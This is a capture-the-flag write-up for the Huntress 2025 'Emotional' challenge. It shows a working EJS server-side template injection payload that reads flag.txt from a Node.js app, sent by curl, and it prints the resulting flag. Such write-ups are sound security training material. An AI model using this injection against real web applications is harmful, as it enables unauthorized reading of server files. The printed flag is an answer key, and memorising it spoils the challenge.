# Prompt

![](/huntress_2025/Day_06/Emotional/Challenge_Emotional.png "Challenge Prompt")

# Solution

- I didn’t get this one until they dropped the source code. I was going down a fun rabbit hole of embedding commands into emojis with no luck, see: 
  - [Paul Butler Write Up](https://paulbutler.org/2025/smuggling-arbitrary-data-through-an-emoji/)
  - [Paul Butler Encoder](https://emoji.paulbutler.org/?mode=encode)
- So after analyzing the code, specifically the server code, that helped me understand what was going on.

```javascript
const emojis = [
    '😊', '😄', '😃', '😁', '😆', '😅', '😂', '🤣',
    '😇', '🙂', '🙃', '😉', '😌', '😍', '🥰', '😘',
    '😗', '😙', '😚', '😋', '😛', '😝', '😜', '🤪',
    '🤨', '🧐', '🤓', '😎', '🤩', '🥳', '😏', '😒',
    '😞', '😔', '😟', '😕', '🙁', '☹', '😣', '😖',
    '😫', '😩', '🥺', '😢', '😭', '😤', '😠', '😡',
    '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰',
    '😥', '😓', '🤗', '🤔', '🤭', '🤫', '🤥', '😶',
    '😐', '😑', '😬', '🙄', '😯', '😦', '😧', '😮',
    '😲', '🥱', '😴', '🤤', '😪', '😵', '🤐', '🥴',
    '🤢', '🤮', '🤧', '😷', '🤒', '🤕', '🤑', '🤠',
    '😈', '👿', '👹', '👺', '🤡', '💩', '👻', '💀',
    '☠', '👽', '👾', '🤖', '🎃', '😺', '😸', '😹',
    '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉',
    '🙊', '💋', '👋', '🤚', '🖐', '✋', '🖖', '👌',
    '🤏', '✌', '🤞', '🤟', '🤘', '🤙', '👈', '👉',
    '👆', '🖕', '👇', '☝', '👍', '👎', '👊', '✊',
    '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏'
];

let selectedEmoji = "😊";

const emojiGrid = document.getElementById('emojiGrid');
emojis.forEach(emoji => {
    const btn = document.createElement('button');
    btn.className = 'emoji-btn';
    btn.textContent = emoji;
    btn.onclick = () => selectEmoji(emoji);
    emojiGrid.appendChild(btn);
});

function selectEmoji(emoji) {
    selectedEmoji = emoji;
    document.getElementById('currentEmoji').textContent = emoji;
    document.getElementById('selectedEmoji').textContent = emoji;
    
    document.querySelectorAll('.emoji-btn').forEach(btn => {
        btn.classList.remove('selected-emoji');
        if (btn.textContent === emoji) {
            btn.classList.add('selected-emoji');
        }
    });
}

selectEmoji(selectedEmoji);
```

```bash
curl http://CHALLENGE_IP/setEmoji -d 'emoji=😊'
# {"profileEmoji":"😊"}
```

- Unlike the other apps which have been Flask, this one is actually a Node application. Judging by the code, we can actually probably do some SSTI or server side execution. After a lot of testing and research, I found a way to read files using EJS template code within a Node.js application.

```javascript
<%- process.mainModule.require("fs").readFileSync("flag.txt","utf8") %>
```

- Full code:

```shell
PAYLOAD='<%- process.mainModule.require("fs").readFileSync("flag.txt","utf8") %>'
curl http://CHALLENGE_IP/setEmoji -d "emoji=$PAYLOAD" 

# {"profileEmoji":"<%- process.mainModule.require(\"fs\").readFileSync(\"flag.txt\",\"utf8\") %>"} 

curl https://CHALLENGE_IP/ | grep -Eo 'flag\{.*'
# flag{8c8e0e59d1292298b64c625b401e8cfa}
```

- Given the nature of the exploit, the initial command needs to be executed against the POST to setEmoji. Then, you need to request the main page and cat for the flag.txt to retrieve the flag. Also, remember to replace the token with your token. 

# Flag

- flag{8c8e0e59d1292298b64c625b401e8cfa}